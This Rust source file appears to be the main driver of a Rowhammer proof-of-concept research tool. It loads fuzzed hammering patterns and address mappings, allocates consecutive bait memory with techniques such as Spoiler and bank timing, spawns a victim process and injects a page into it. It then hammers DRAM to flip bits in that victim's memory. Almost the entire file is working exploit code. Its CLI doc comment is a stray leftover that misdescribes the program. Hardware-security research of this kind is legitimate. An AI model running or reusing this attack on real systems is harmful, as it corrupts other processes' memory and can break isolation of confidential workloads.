use std::{
    fmt::Debug,
    fs::File,
    io::{stdin, BufReader},
    process::{ChildStdin, ChildStdout},
};

use anyhow::bail;
use bs_poc::allocator::hugepage::HugepageAllocator;
use bs_poc::allocator::{CoCo, HugepageRandomized, Spoiler};
use bs_poc::hammerer::blacksmith::blacksmith_config::BlacksmithConfig;
use bs_poc::hammerer::blacksmith::hammerer::{
    FuzzSummary, HammerResult, HammeringPattern, PatternAddressMapper,
};
use bs_poc::hammerer::Hammering;
use bs_poc::memory::mem_configuration::MemConfiguration;
use bs_poc::victim::{process, HammerVictim};
use bs_poc::{
    allocator,
    allocator::{BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap},
    hammerer,
    memory::ConsecCheck,
    victim,
};
use bs_poc::{
    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming, ConsecCheckNone, ConsecCheckPfn},
    retry,
    util::{init_logging_with_progress, PipeIPC},
};
use clap::Parser;
use indicatif::MultiProgress;
use log::{info, warn};

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The BlacksmithConfig
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
    #[clap(long = "mapping")]
    mapping: Option<String>,
    #[clap(long = "consec-check", default_value = "bank-timing")]
    consec_check: ConsecCheckType,
    #[clap(long = "alloc-strategy", default_value = "spoiler")]
    alloc_strategy: ConsecAllocType,
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// The target to hammer
    target: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum HammerStrategy {
    Dummy,
    Blacksmith,
    None,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecCheckType {
    BankTiming,
    None,
    Pfn,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecAllocType {
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    Hugepage,
    HugepageRnd,
    Mmap,
    Spoiler,
}

fn create_allocator_from_cli(
    alloc_strategy: ConsecAllocType,
    consec_checker: ConsecCheck,
    progress: Option<MultiProgress>,
) -> ConsecAlloc {
    match alloc_strategy {
        ConsecAllocType::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(consec_checker)),
        ConsecAllocType::CoCo => ConsecAlloc::CoCo(CoCo {}),
        ConsecAllocType::Mmap => ConsecAlloc::Mmap(Mmap::new(consec_checker, progress)),
        ConsecAllocType::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::new()),
        ConsecAllocType::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
        ConsecAllocType::Spoiler => ConsecAlloc::Spoiler(Spoiler::new()),
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(&option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

fn create_consec_checker_from_cli(
    consec_check: ConsecCheckType,
    mem_config: MemConfiguration,
    conflict_threshold: u64,
    progress: Option<MultiProgress>,
) -> anyhow::Result<ConsecCheck> {
    Ok(match consec_check {
        ConsecCheckType::None => ConsecCheck::None(ConsecCheckNone {}),
        ConsecCheckType::Pfn => ConsecCheck::Pfn(ConsecCheckPfn {}),
        ConsecCheckType::BankTiming => ConsecCheck::BankTiming(
            ConsecCheckBankTiming::new_with_progress(mem_config, conflict_threshold, progress),
        ),
    })
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);
    Ok(LoadedPattern { pattern, mapping })
}

fn hammer(
    hammerer: HammerStrategy,
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
    victim: &mut dyn HammerVictim,
    mem_config: MemConfiguration,
    block_size: usize,
    memory: &ConsecBlocks,
) -> anyhow::Result<HammerResult> {
    let block_shift = block_size.ilog2();
    let hammerer: Box<dyn Hammering> = match hammerer {
        HammerStrategy::Blacksmith => {
            let hammering_addrs = mapping.get_hammering_addresses_relocate(
                &pattern.access_ids,
                mem_config,
                block_shift as usize,
                memory,
            )?;
            Box::new(hammerer::Blacksmith::new(
                mem_config,
                pattern.clone(),
                mapping.clone(),
                &hammering_addrs,
                memory.blocks.iter().collect(),
            )?)
        }
        HammerStrategy::Dummy => {
            let flip = mapping.get_bitflips_relocate(mem_config, &memory);
            let flip = flip.concat().pop().unwrap_or(memory.blocks[0].addr(0x42)) as *mut u8;
            info!(
                "Running dummy hammerer with flip at VA 0x{:02x}",
                flip as usize
            );
            let hammerer = hammerer::Dummy::new(flip);
            Box::new(hammerer)
        }
        HammerStrategy::None => {
            warn!("No hammerer specified. Exiting.");
            return Ok(HammerResult { run: 0, attempt: 0 });
        }
    };
    let flips = mapping.bit_flips;
    info!("Expected bitflips: {:?}", flips);

    info!("Hammering pattern. This might take a while...");
    hammerer.hammer(victim, 3)
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();
    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    let consec_checker = create_consec_checker_from_cli(
        args.consec_check,
        mem_config,
        config.threshold,
        Some(progress.clone()),
    )?;
    let alloc_strategy =
        create_allocator_from_cli(args.alloc_strategy, consec_checker, Some(progress.clone()));
    let block_size = alloc_strategy.block_size();

    info!("Starting bait allocation");
    let memory = allocator::alloc_memory(alloc_strategy, mem_config, &pattern.mapping)?;
    info!("Allocated {} bytes of memory", memory.len());

    let mut victim = process::spawn_victim(&args.target)?;
    process::log_victim_stderr(&mut victim)?;

    let mut hammer_victim: Box<dyn HammerVictim> = match &mut victim {
        Some(victim) => {
            let mut pipe: PipeIPC<ChildStdout, ChildStdin> = process::piped_channel(victim)?;
            process::inject_page(&mut pipe)?;
            Box::new(victim::Process::new(pipe))
        }
        None => {
            warn!(
            "No target specified. Consider `./hammer --config [...] your_victim your_victim_args`"
        );
            Box::new(victim::MemCheck::new(mem_config, &memory))
        }
    };

    let result = hammer(
        args.hammerer,
        pattern.pattern,
        pattern.mapping,
        &mut *hammer_victim,
        mem_config,
        block_size,
        &memory,
    );
    match result {
        Ok(res) => {
            info!("{:?}", res);
            hammer_victim.log_report();
        }
        Err(e) => {
            warn!("Hammering not successful: {:?}", e);
        }
    }

    drop(hammer_victim);

    if let Some(victim) = victim {
        info!("Waiting for victim to finish");
        let output = victim.wait_with_output()?;
        info!("Captured output: {:?}", output);
    }
    info!("Goodbye.");

    Ok(())
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
